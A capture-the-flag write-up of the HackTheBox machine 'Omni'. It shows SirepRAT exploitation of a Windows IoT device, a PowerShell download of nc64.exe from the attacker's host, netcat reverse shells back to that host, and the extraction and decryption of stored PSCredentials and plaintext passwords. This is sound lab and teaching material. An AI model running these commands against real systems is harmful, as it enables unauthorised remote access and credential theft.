# Omni | HackTheBox

### 1. Scan
```bash
kali@kali:~$ nmap -A -p- -Pn -T4 10.10.10.204
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-06 21:08 EDT
Nmap scan report for 10.10.10.204
Host is up (0.33s latency).
Not shown: 65529 filtered ports
PORT      STATE SERVICE  VERSION
135/tcp   open  msrpc    Microsoft Windows RPC
5985/tcp  open  upnp     Microsoft IIS httpd
8080/tcp  open  upnp     Microsoft IIS httpd
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Windows Device Portal
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Site doesn't have a title.
29817/tcp open  unknown
29819/tcp open  arcserve ARCserve Discovery
29820/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port29820-TCP:V=7.80%I=7%D=9/6%Time=5F55906A%P=x86_64-pc-linux-gnu%r(NU
SF:LL,10,"\*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12")%r(GenericLines,10,"\
SF:*LY\xa5\xfb`\x04G\xa9m\x1c\xc9}\xc8O\x12")%r(Help,10,"*LY\xa5\xfb`\x04
SF:G\xa9m\x1c\xc9}\xc8O\x12")%r(JavaRMI,10,"\*LY\xa5\xfb`\x04G\xa9m\x1c\xc
SF:9}\xc8O\x12");
Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2251.40 seconds\
```
The machine is running MS Windows RPC, two HTTP services on 5985 and 8080 (5985 is probably WinRM?), and on higher ports there is an ARCserve service and a few unknown things.

### 2. Enumeration
Starting with the HTTP services, visiting the site on 8080 triggers a popup login prompt:
```
http://10.10.10.204:8080 is requesting your username and password. The site says: “Windows Device Portal”
```
I can't dirbust the this portal either due to wildcard responses. For now I will move on.
  
Moving the ARCserve Discovery service, which part of the ARCServe backup/data recovery solution. I can connect to the port using nc to see what info comes back
```bash
kali@kali:~$ nc 10.10.10.204 29819
PING
```
There is clearly a method to communicate with this process in cleartext, but for now I am unable to find many resources online explaining how it works.  
With the rest of the services not yeilding anything noteworthy I resort to searching for basic Windows IoT enumeration methods and find a known exploit that allows remote command execution. Testing it, I am able to retrieve some basic system information from the machine.
```bash
kali@kali:~/Desktop/htb/omni/SirepRAT$ ./SirepRAT.py -h
usage: SirepRAT.py target_device_ip command_type [options]

Exploit Windows IoT Core's Sirep service to execute remote commands on the device

positional arguments:
  target_device_ip      The IP address of the target IoT Core device
  command_type          The Sirep command to use. Available commands are listed below

optional arguments:
  -h, --help            show this help message and exit
  --return_output       Set to have the target device return the command output stream
  --cmd CMD             Program path to execute
  --as_logged_on_user   Set to impersonate currently logged on user on the target device
  --args ARGS           Arguments string for the program
  --base_directory BASE_DIRECTORY
                        The working directory from which to run the desired program
  --remote_path REMOTE_PATH
                        Path on target device
  --data DATA           Data string to write to file
  --v                   Verbose - if printable, print result
  --vv                  Very verbose - print socket buffers and more

available commands:
*       LaunchCommandWithOutput
*       PutFileOnDevice
*       GetFileFromDevice
*       GetSystemInformationFromDevice
*       GetFileInformationFromDevice

remarks:
-       Use moustaches to wrap remote environment variables to expand (e.g. {{userprofile}})

Usage example: python SirepRAT.py 192.168.3.17 GetFileFromDevice --remote_path C:\Windows\System32\hostname.exe
kali@kali:~/Desktop/htb/omni/SirepRAT$ ./SirepRAT.py 10.10.10.204 GetSystemInformationFromDevice
<SystemInformationResult | type: 51, payload length: 32, kv: {'wProductType': 0, 'wServicePackMinor': 2, 'dwBuildNumber': 17763, 'dwOSVersionInfoSize': 0, 'dwMajorVersion': 10, 'wSuiteMask': 0, 'dwPlatformId': 2, 'wReserved': 0, 'wServicePackMajor': 1, 'dwMinorVersion': 0, 'szCSDVersion': 0}>
```
It is also possible do so some more enumeration via this exploit.
```bash
kali@kali:~/Desktop/htb/omni/SirepRAT$ ./SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\hostname
<OutputStreamResult | type: 11, payload length: 6, payload peek: 'omni'>

kali@kali:~/Desktop/htb/omni/SirepRAT$ ./SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c echo {{userprofile}}"
<OutputStreamResult | type: 11, payload length: 30, payload peek: 'C:\Data\Users\DefaultAccount'>
```
Additionally I can see I am definately able to run commands to enumerate directories on the system.
```bash
kali@kali:~/Desktop/htb/omni/SirepRAT$ ./SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c echo {{userprofile}}"
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<OutputStreamResult | type: 11, payload length: 22, payload peek: 'C:\Data\Users\System'>
<ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>
kali@kali:~/Desktop/htb/omni/SirepRAT$ ./SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c dir"
---------
 Volume in drive C is MainOS
 Volume Serial Number is 3C37-C677

 Directory of C:\

07/20/2020  02:36 AM    <DIR>          $Reconfig$
10/26/2018  11:35 PM    <JUNCTION>     Data [\??\Volume{ac55f613-7018-45c7-b1e9-7ddda60262fd}\]
10/26/2018  11:37 PM    <DIR>          Program Files
10/26/2018  11:38 PM    <DIR>          PROGRAMS
10/26/2018  11:37 PM    <DIR>          SystemData
09/11/2020  12:35 AM    <DIR>          tmp
10/26/2018  11:37 PM    <DIR>          Users
09/10/2020  03:25 PM    <DIR>          Windows
               2 File(s)         78,329 bytes
               8 Dir(s)     565,153,792 bytes free
```
Continuing to enumerate, I find the user's folder.
```bash
kali@kali:~/Desktop/htb/omni/SirepRAT$ ./SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c dir C:\Data\Users\app" --v
---------
 Volume in drive C is MainOS
 Volume Serial Number is 3C37-C677

 Directory of C:\Data\Users\app

07/04/2020  09:53 PM    <DIR>          .
07/04/2020  09:53 PM    <DIR>          ..
07/04/2020  07:28 PM    <DIR>          3D Objects
07/04/2020  07:28 PM    <DIR>          Documents
07/04/2020  07:28 PM    <DIR>          Downloads
07/04/2020  07:28 PM    <DIR>          Favorites
07/04/2020  08:20 PM               344 hardening.txt
07/04/2020  08:14 PM             1,858 iot-admin.xml
07/04/2020  07:28 PM    <DIR>          Music
07/04/2020  07:28 PM    <DIR>          Pictures
07/04/2020  09:53 PM             1,958 user.txt
07/04/2020  07:28 PM    <DIR>          Videos
               3 File(s)          4,160 bytes
               9 Dir(s)   4,692,606,976 bytes free

---------
^[[A<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<OutputStreamResult | type: 11, payload length: 787, payload peek: ' Volume in drive C is MainOS Volume Serial Numbe'>
<ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>
```
Viewing the user.txt shows a serialized PSCredentialObject.
```bash
kali@kali:~/Desktop/htb/omni/SirepRAT$ ./SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c type C:\Data\Users\app\user.txt" --v
---------
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">flag</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7</SS>
    </Props>
  </Obj>
</Objs>
---------
```
I know that PSCredentials can be decrypted, so I try to do it, however keep getting errors related to cryptography, which research shows probably means I am not performing the operation as the right user. However, finding them is still pretty good.
Additionally there are some other interesting files in this folder.
```bash
kali@kali:~/Desktop/htb/omni/SirepRAT$ ./SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c type C:\Data\Users\app\hardening.txt" --v
---------
Access is denied.

---------

kali@kali:~/Desktop/htb/omni/SirepRAT$ ./SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c type C:\Data\Users\app\iot-admin.xml" --v
---------
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">omni\administrator</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa28853640000000002000000000010660000000100002000000000855856bea37267a6f9b37f9ebad14e910d62feb252fdc98a48634d18ae4ebe000000000e80000000020000200000000648cd59a0cc43932e3382b5197a1928ce91e87321c0d3d785232371222f554830000000b6205d1abb57026bc339694e42094fd7ad366fe93cbdf1c8c8e72949f56d7e84e40b92e90df02d635088d789ae52c0d640000000403cfe531963fc59aa5e15115091f6daf994d1afb3c2643c945f2f4bf15859703650f2747a60cf9e70b56b91cebfab773d0ca89a57553ea1040af3ea3085c27</SS>
    </Props>
  </Obj>
</Objs>
---------
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<OutputStreamResult | type: 11, payload length: 928, payload peek: '<Objs Version="1.1.0.1" xmlns="http://schemas.micr'>
<ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>8
```
This iot-admin.xml file appears to contain the credential to the admin user.
Additionally I am able to locate the SAM/SYSTEM hives but am unable to extract them using the script.
```bash
kali@kali:~/Desktop/htb/omni/SirepRAT$ ./SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c dir C:\Data\Windows\system32\config" --v
---------
 Volume in drive C is MainOS
 Volume Serial Number is 3C37-C677

 Directory of C:\Data\Windows\system32\config

10/26/2018  11:38 PM    <DIR>          .
10/26/2018  11:38 PM    <DIR>          ..
10/26/2018  11:38 PM             8,192 BBI
10/26/2018  11:38 PM            16,384 COMPONENTS
10/26/2018  11:38 PM             8,192 DEFAULT
10/26/2018  11:38 PM             8,192 DRIVERS
10/26/2018  11:38 PM             8,192 ELAM
10/26/2018  11:38 PM             8,192 SAM
10/26/2018  11:38 PM             8,192 SECURITY
10/26/2018  11:38 PM            12,288 SOFTWARE
10/26/2018  11:38 PM             8,192 SYSTEM
               9 File(s)         86,016 bytes
               2 Dir(s)   4,692,606,976 bytes free

---------
```
Obviously there are some limitations with what the script can do, and an actual shell would be better.

### 2. Get a (real) shell
To do this I figure it might be best to have a proper shell on the box. So lets do it. Upload nc64 using powershell:
```bash
kali@kali:~/Desktop/htb/omni/SirepRAT$ ./SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell -c Invoke-WebRequest -Uri 'http://10.10.15.158:8000/nc64.exe' -OutFile C:\nc64.exe" --v
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
```
Run nc with a listener open.
```bash
kali@kali:~/Desktop/htb/omni/SirepRAT$ ./SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\nc64.exe" --args " -nv 10.10.15.158 9999 -e cmd.exe" --v
---------
(UNKNOWN) [10.10.15.158] 9999 (?) open

---------
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
<OutputStreamResult | type: 11, payload length: 40, payload peek: '(UNKNOWN) [10.10.15.158] 9999 (?) open'>
```
Catch the shell.
```bash
kali@kali:~$ nc -lvnp 9999
Listening on 0.0.0.0 9999
Connection received on 10.10.10.204 49671
Microsoft Windows [Version 10.0.17763.107]
Copyright (c) Microsoft Corporation. All rights reserved.

C:\windows\system32>
```

### 3. Enumeration from the foothold
From this command shell I can launch powershell and use it to more easily look around the system. There isn't a whole lot to go through and I use recursive ls to get through everything quickly. I also use a command to focus in on all files that have been created recently:  
`gci . -recurse -force -ErrorAction SilentlyContinue | where { ! $_.PSIsContainer } | sort LastWriteTime | select -first 3`  
Using this around the place, I find a file called r.bat.  
```bash
PS C:\Program Files> gci . -recurse -force -ErrorAction SilentlyContinue | where { ! $_.PSIsContainer } | sort LastWriteTime | select -last 3

    Directory: C:\Program 
    Files\WindowsPowerShell\Modules\PackageManagement\1.0.0.1\DSCResources


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----       10/26/2018  11:37 PM           9395 PackageManagementDscUtilities.
                                                 psm1                          


    Directory: C:\Program 
    Files\WindowsPowerShell\Modules\PackageManagement\1.0.0.1


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a----       10/26/2018  11:37 PM         165376 Microsoft.PowerShell.PackageMa
                                                 nagement.dll                  


    Directory: C:\Program Files\WindowsPowerShell\Modules\PackageManagement


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
-a-h--        8/21/2020  12:56 PM            247 r.bat
```
Opening the file, it appears to be a setup script to create two user accounts.
```bash
PS C:\Program Files> cat 'C:\Program Files\WindowsPowerShell\Modules\PackageManagement\r.bat'
cat 'C:\Program Files\WindowsPowerShell\Modules\PackageManagement\r.bat'
@echo off

:LOOP

for /F "skip=6" %%i in ('net localgroup "administrators"') do net localgroup "administrators" %%i /delete

net user app mesh5143
net user administrator _1nt3rn37ofTh1nGz

ping -n 3 127.0.0.1

cls

GOTO :LOOP

:EXIT
```
This gives two credential pairs: `app:mesh5143` and `administrator:_1nt3rn37ofTh1nGz`.  
Also in the administrator's user directory I find another PSCredential. Still can't decrypt it though as the current user.
```bash
PS C:\Data\Users\administrator> cat root.txt
cat root.txt
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">flag</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7</SS>
    </Props>
  </Obj>
</Objs>
```
However I now have credentials to some different users to try out.

### 4. Access a different user
Since I now have creds, I can go back to Windows Device Portal on 10.10.10.204:8080 and log in, starting as the "app" user. From this portal I can perform various tasks on the device. I find a "Run Command" function that looks promising. Playing around with it, it appears to be a cmd shell. I can probably just run netcat again from here to get a new shell.
```bash
C:\nc64.exe -nv 10.10.15.158 9998 -e cmd.exe
```
The webshell hangs, but my listener catches the new shell.
```bash
kali@kali:~/Desktop/htb/omni/www$ nc -lvnp 9998
Listening on 0.0.0.0 9998
Connection received on 10.10.10.204 49677
Microsoft Windows [Version 10.0.17763.107]
Copyright (c) Microsoft Corporation. All rights reserved.

C:\windows\system32>
```

### 5. Decrypt the user credential
I can immediately hop back into powershell and try loading in the user.txt PSCredential now.
```bash
PS C:\data\Users\app> $UserCred = Import-Clixml -Path user.txt
$UserCred = Import-Clixml -Path user.txt

S C:\data\Users\app> echo $UserCred
echo $UserCred

UserName                     Password
--------                     --------
flag     System.Security.SecureString

PS C:\data\Users\app> $UserCred.GetNetworkCredential().password
```
The final command shows the flag in plaintext.

### 6. Decrypt to administrator credential
I repeat the above steps to also get the administrator flag.
```bash
kali@kali:~/Desktop/htb/omni/www$ nc -lvnp 9998
Listening on 0.0.0.0 9998
Connection received on 10.10.10.204 49679
Microsoft Windows [Version 10.0.17763.107]
Copyright (c) Microsoft Corporation. All rights reserved.

C:\windows\system32>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\windows\system32> cd C:\data\Users\administrator
PS C:\data\Users\administrator> $UserCred = Import-Clixml -Path root.txt
$UserCred = Import-Clixml -Path root.txt
PS C:\data\Users\administrator> echo $UserCred
echo $UserCred

UserName                     Password
--------                     --------
flag     System.Security.SecureString


PS C:\data\Users\administrator> $UserCred.GetNetworkCredential().password
```